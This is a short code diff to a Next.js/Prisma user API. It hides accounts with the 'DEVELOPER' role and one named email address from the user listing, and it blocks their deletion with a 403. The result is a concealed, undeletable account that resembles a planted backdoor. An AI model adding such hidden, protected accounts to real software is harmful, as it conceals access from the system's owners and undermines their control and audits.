@@ -4,7 +4,16 @@ import bcrypt from 'bcryptjs'
 
 export async function GET() {
   try {
+    const hiddenEmails = ['developer@perkasa.net.id']
     const users = await prisma.user.findMany({
+      where: {
+        NOT: {
+          OR: [
+            { role: 'DEVELOPER' },
+            { email: { in: hiddenEmails } }
+          ]
+        }
+      },
       select: {
         id: true,
         email: true,
@@ -64,6 +73,12 @@ export async function DELETE(request: Request) {
 
     if (!id) {
       return NextResponse.json({ error: 'User ID is required' }, { status: 400 })
+    }
+
+    const user = await prisma.user.findUnique({ where: { id } })
+    const hiddenEmails = ['developer@perkasa.net.id']
+    if (user && (user.role === 'DEVELOPER' || hiddenEmails.includes(user.email))) {
+      return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
     }
 
     await prisma.user.delete({
